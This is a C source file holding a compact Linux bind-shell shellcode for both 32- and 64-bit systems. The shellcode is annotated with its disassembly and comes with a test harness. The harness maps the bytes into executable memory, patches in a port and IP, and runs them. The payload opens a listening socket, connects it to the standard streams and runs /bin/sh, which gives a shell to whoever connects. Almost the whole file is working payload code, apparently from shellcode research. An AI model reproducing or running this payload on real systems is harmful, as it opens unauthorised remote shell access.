/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/mman.h>

// bind shell for 32 and 64-bit Linux
//
#define BS_SIZE 156

char BS[] = {
  /* 0000 */ "\xb8\xfd\xff\xfb\x2d"         /* mov eax, 0x2dfbfffd             */
  /* 0005 */ "\xbb\xff\xff\xff\xff"         /* mov ebx, 0xffffffff             */
  /* 000A */ "\xf7\xd0"                     /* not eax                         */
  /* 000C */ "\xf7\xd3"                     /* not ebx                         */
  /* 000E */ "\x50"                         /* push rax                        */
  /* 000F */ "\x50"                         /* push rax                        */
  /* 0010 */ "\x54"                         /* push rsp                        */
  /* 0011 */ "\x5f"                         /* pop rdi                         */
  /* 0012 */ "\xab"                         /* stosd                           */
  /* 0013 */ "\x93"                         /* xchg ebx, eax                   */
  /* 0014 */ "\xab"                         /* stosd                           */
  /* 0015 */ "\x54"                         /* push rsp                        */
  /* 0016 */ "\x5d"                         /* pop rbp                         */
  /* 0017 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 0019 */ "\x99"                         /* cdq                             */
  /* 001A */ "\xb0\x67"                     /* mov al, 0x67                    */
  /* 001C */ "\x6a\x01"                     /* push 0x1                        */
  /* 001E */ "\x5e"                         /* pop rsi                         */
  /* 001F */ "\x6a\x02"                     /* push 0x2                        */
  /* 0021 */ "\x5f"                         /* pop rdi                         */
  /* 0022 */ "\x48\x75\x24"                 /* jnz 0x49                        */
  /* 0025 */ "\xb0\x29"                     /* mov al, 0x29                    */
  /* 0027 */ "\x0f\x05"                     /* syscall                         */
  /* 0029 */ "\x97"                         /* xchg edi, eax                   */
  /* 002A */ "\x55"                         /* push rbp                        */
  /* 002B */ "\x5e"                         /* pop rsi                         */
  /* 002C */ "\xb2\x10"                     /* mov dl, 0x10                    */
  /* 002E */ "\xb0\x31"                     /* mov al, 0x31                    */
  /* 0030 */ "\x0f\x05"                     /* syscall                         */
  /* 0032 */ "\x50"                         /* push rax                        */
  /* 0033 */ "\x5e"                         /* pop rsi                         */
  /* 0034 */ "\xb0\x32"                     /* mov al, 0x32                    */
  /* 0036 */ "\x0f\x05"                     /* syscall                         */
  /* 0038 */ "\xb0\x2b"                     /* mov al, 0x2b                    */
  /* 003A */ "\x0f\x05"                     /* syscall                         */
  /* 003C */ "\x97"                         /* xchg edi, eax                   */
  /* 003D */ "\x96"                         /* xchg esi, eax                   */
  /* 003E */ "\xb0\x21"                     /* mov al, 0x21                    */
  /* 0040 */ "\x0f\x05"                     /* syscall                         */
  /* 0042 */ "\x83\xee\x01"                 /* sub esi, 0x1                    */
  /* 0045 */ "\x79\xf7"                     /* jns 0x3e                        */
  /* 0047 */ "\xeb\x2f"                     /* jmp 0x78                        */
  /* 0049 */ "\x56"                         /* push rsi                        */
  /* 004A */ "\x5b"                         /* pop rbx                         */
  /* 004B */ "\x52"                         /* push rdx                        */
  /* 004C */ "\x53"                         /* push rbx                        */
  /* 004D */ "\x57"                         /* push rdi                        */
  /* 004E */ "\x54"                         /* push rsp                        */
  /* 004F */ "\x59"                         /* pop rcx                         */
  /* 0050 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0052 */ "\x97"                         /* xchg edi, eax                   */
  /* 0053 */ "\x5b"                         /* pop rbx                         */
  /* 0054 */ "\x5e"                         /* pop rsi                         */
  /* 0055 */ "\x6a\x10"                     /* push 0x10                       */
  /* 0057 */ "\x55"                         /* push rbp                        */
  /* 0058 */ "\x57"                         /* push rdi                        */
  /* 0059 */ "\xb0\x66"                     /* mov al, 0x66                    */
  /* 005B */ "\x89\xe1"                     /* mov ecx, esp                    */
  /* 005D */ "\xcd\x80"                     /* int 0x80                        */
  /* 005F */ "\x89\x51\x04"                 /* mov [rcx+0x4], edx              */
  /* 0062 */ "\xb0\x66"                     /* mov al, 0x66                    */
  /* 0064 */ "\xb3\x04"                     /* mov bl, 0x4                     */
  /* 0066 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0068 */ "\xb0\x66"                     /* mov al, 0x66                    */
  /* 006A */ "\x43\xcd\x80"                 /* int 0x80                        */
  /* 006D */ "\x6a\x02"                     /* push 0x2                        */
  /* 006F */ "\x59"                         /* pop rcx                         */
  /* 0070 */ "\x93"                         /* xchg ebx, eax                   */
  /* 0071 */ "\xb0\x3f"                     /* mov al, 0x3f                    */
  /* 0073 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0075 */ "\x49\x79\xf9"                 /* jns 0x71                        */
  /* 0078 */ "\x99"                         /* cdq                             */
  /* 0079 */ "\x31\xf6"                     /* xor esi, esi                    */
  /* 007B */ "\x50"                         /* push rax                        */
  /* 007C */ "\x50"                         /* push rax                        */
  /* 007D */ "\x50"                         /* push rax                        */
  /* 007E */ "\x54"                         /* push rsp                        */
  /* 007F */ "\x5b"                         /* pop rbx                         */
  /* 0080 */ "\x53"                         /* push rbx                        */
  /* 0081 */ "\x5f"                         /* pop rdi                         */
  /* 0082 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
  /* 0088 */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
  /* 008F */ "\x40\x75\x04"                 /* jnz 0x96                        */
  /* 0092 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 0094 */ "\x0f\x05"                     /* syscall                         */
  /* 0096 */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 0098 */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 009A */ "\xcd\x80"                     /* int 0x80                        */
};

void bin2file(void *p, int len)
{
  FILE *out = fopen("rs.bin", "wb");
  if (out!= NULL)
  {
    fwrite(p, 1, len, out);
    fclose(out);
  }
}

void xcode(char *s, int len, uint32_t ip, int16_t port)
{
  uint8_t *p;

  p=(uint8_t*)mmap (0, len,
      PROT_EXEC | PROT_WRITE | PROT_READ,
      MAP_ANON  | MAP_PRIVATE, -1, 0);

  memcpy(p, s, len);
  memcpy((void*)&p[3], &port, 2); // set the port
  memcpy((void*)&p[6], &ip,   4); // set the ip

  //bin2file(p, len);

  // execute
  ((void(*)())p)();

  munmap ((void*)p, len);
}

int main(int argc, char *argv[])
{
  uint32_t ip   = 0;
  int16_t  port = 0;

  if (argc < 2) {
    printf ("\nbs_test <port> <optional ip>\n");
    return 0;
  }
  port = atoi(argv[1]);

  if (port<0 || port>65535) {
    printf ("\ninvalid port specified\n");
    return 0;
  }
  port = htons(port);

  // optional ip address?
  if (argc > 2) {
    ip = inet_addr(argv[2]);
  }
  // invert both to mask null bytes.
  // obviously no rigorous checking here
  ip   = ~ip;
  port = ~port;

  xcode (BS, BS_SIZE, ip, port);
  return 0;
}